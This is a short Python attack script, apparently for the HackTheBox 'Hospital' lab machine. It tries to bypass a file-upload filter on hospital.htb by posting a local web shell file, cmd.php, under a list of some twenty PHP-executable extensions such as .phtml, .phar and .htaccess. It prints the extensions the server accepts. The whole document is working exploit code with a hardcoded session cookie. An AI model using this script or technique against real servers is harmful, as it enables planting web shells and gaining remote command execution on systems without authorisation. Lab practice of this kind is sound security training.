#!/usr/bin/env python3

import requests
import pdb
import signal
import sys

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting fileUpload_hospital.py script....\n", 'red'))
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:8080/upload.php"
cookies = {'PHPSESSID': 'rn12s1n0u237a3iugqqo9of5fp'}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

def fileUpload():

    f = open("/home/shadow42/hax0rn00b/hospital/cmd.php", "r")
    fileContent = f.read()

    for extension in extensions:
        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
        r = requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
        #print(r.status_code)
        #pdb.set_trace()
        if "failed" not in r.headers["Location"]:
            print(colored(f"\n[+] Extension {extension}: {r.headers['Location']}", 'green'))


if __name__ == '__main__':
    fileUpload()